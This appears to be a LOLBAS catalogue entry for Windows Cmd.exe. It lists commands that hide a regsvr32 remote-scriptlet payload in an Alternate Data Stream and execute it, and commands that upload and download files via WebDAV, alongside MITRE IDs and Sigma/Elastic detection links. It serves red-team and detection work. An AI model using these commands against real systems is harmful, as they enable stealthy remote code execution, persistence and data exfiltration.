---
Acknowledgement:
- Handle: '@yeyint_mth'
  Person: r0lan
- Person: Mr.0ra
Author: Ye Yint Min Thu Htut
Commands:
- Category: ADS
  Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll >
    {PATH}:payload.bat
  Description: Add content to an Alternate Data Stream (ADS).
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Can be used to evade defensive countermeasures or to hide as a persistence
    mechanism
- Category: ADS
  Command: cmd.exe - < {PATH}:payload.bat
  Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
  MitreID: T1059.003
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Can be used to evade defensive countermeasures or to hide as a persistence
    mechanism
- Category: Download
  Command: type {PATH_SMB} > {PATH_ABSOLUTE}
  Description: Downloads a specified file from a WebDAV server to the target file.
  MitreID: T1105
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Download/copy a file from a WebDAV server
- Category: Upload
  Command: type {PATH_ABSOLUTE} > {PATH_SMB}
  Description: Uploads a specified file to a WebDAV server.
  MitreID: T1048.003
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Upload a file to a WebDAV server
Created: 2019-06-26
Description: The command-line interpreter in Windows
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_susp_alternate_data_streams.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
- Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
- IOC: cmd.exe executing files from alternate data streams.
- IOC: cmd.exe creating/modifying file contents in an alternate data stream.
Full_Path:
- Path: C:\Windows\System32\cmd.exe
- Path: C:\Windows\SysWOW64\cmd.exe
Name: Cmd.exe
Resources:
- Link: https://twitter.com/yeyint_mth/status/1143824979139579904
- Link: https://twitter.com/Mr_0rng/status/1601408154780446721
- Link: https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
- Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type
mitre_data:
  technique_ids:
  - T1564.004
  - T1059.003
  - T1105
  - T1048.003
tags:
- lolbas/osbinaries
---

# Cmd.exe

The command-line interpreter in Windows

# Path(s)

- `C:\Windows\System32\cmd.exe`
- `C:\Windows\SysWOW64\cmd.exe`

# ADS Commands

Add content to an Alternate Data Stream (ADS).

```batch
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
```

- **Usecase:** Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Execute payload.bat stored in an Alternate Data Stream (ADS).

```batch
cmd.exe - < {PATH}:payload.bat
```

- **Usecase:** Can be used to evade defensive countermeasures or to hide as a persistence mechanism
- **Privileges Required:** User
- **MitreID:** `T1059.003`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Upload Commands

Uploads a specified file to a WebDAV server.

```batch
type {PATH_ABSOLUTE} > {PATH_SMB}
```

- **Usecase:** Upload a file to a WebDAV server
- **Privileges Required:** User
- **MitreID:** `T1048.003`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Download Commands

Downloads a specified file from a WebDAV server to the target file.

```batch
type {PATH_SMB} > {PATH_ABSOLUTE}
```

- **Usecase:** Download/copy a file from a WebDAV server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://twitter.com/yeyint_mth/status/1143824979139579904
- https://twitter.com/Mr_0rng/status/1601408154780446721
- https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type
# Acknowledgements

- Ye Yint Min Thu Htut (Authored, 2019-06-26)
- r0lan (@yeyint_mth)
- Mr.0ra